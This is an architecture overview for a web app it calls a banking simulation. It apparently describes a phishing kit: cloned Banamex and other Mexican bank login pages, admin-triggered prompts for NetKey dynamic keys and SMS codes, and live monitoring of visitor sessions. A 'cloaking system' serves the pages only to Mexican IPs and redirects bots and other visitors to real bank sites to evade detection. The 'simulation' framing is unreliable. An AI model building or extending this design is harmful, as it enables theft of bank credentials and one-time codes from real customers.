# Overview

This full-stack web application is a banking simulation system, built with React (frontend) and Express.js (backend). It mimics banking interfaces for multiple Mexican banks, featuring user management, session tracking, and communication capabilities. The system serves a dual purpose: client-facing banking interfaces and an administrative panel for monitoring and managing sessions.

# User Preferences

Preferred communication style: Simple, everyday language.

# System Architecture

The application employs a modern full-stack architecture with clear separation between client and server:

-   **Frontend**: React with TypeScript, using Vite.
-   **Backend**: Express.js with TypeScript.
-   **Database**: PostgreSQL with Drizzle ORM.
-   **Real-time Communication**: WebSockets for live session updates.
-   **Styling**: Tailwind CSS with shadcn/ui components.
-   **Authentication**: Passport.js with session-based authentication.
-   **UI/UX**: Mimics official Mexican bank interfaces (e.g., Banamex), including specific login flows, NetKey (Clave Dinámica) authentication, update screens, and contact forms. Features carousels, blurred loading states, and professional branding.
-   **Cloaking System**: Implements IP-based geolocation filtering using `geoip-lite` to restrict access to Mexican IP addresses and redirect non-Mexican IPs or detected bots to external banking sites. Development access bypasses these restrictions for local and automated testing.
-   **Authentication Flows**:
    -   **NetKey2 Authentication**: Comprehensive implementation of Banamex's NetKey2 (dynamic key) system, including challenge-response mechanisms, contact forms, and specific UI elements.
    -   **Custom & Manual NetKey**: Admin-triggered NetKey authentication allows for on-demand verification at any point in a session, with customizable challenge codes and full Banamex-designed interfaces for manual entry.
    -   **SMS Verification**: Integrated into the QR validation flow, requiring an SMS code after QR approval.
-   **Core Components**:
    -   **Frontend**: Modular React components, Wouter for routing, TanStack Query for server state, shadcn/ui for UI, Tailwind CSS for styling.
    -   **Backend**: RESTful endpoints, Passport.js for authentication, Drizzle ORM for PostgreSQL, WebSocket server for real-time features, Express sessions for management.
-   **Database Schema**: Includes tables for Users (roles, device limits), Sessions (banking data, screen state), SMS Config/History, Access Keys, and Devices.
-   **Key Architectural Decisions**: Monorepo structure, TypeScript across the stack, real-time updates via WebSockets, multi-bank support, role-based access, session-based architecture, device management, and robust cloaking/security measures.

# External Dependencies

-   **Database**: Neon PostgreSQL.
-   **SMS Services**: Integration with SMS providers.
-   **Email Services**: SendGrid.
-   **Payment Processing**: Stripe.
-   **Geolocation**: `geoip-lite` library.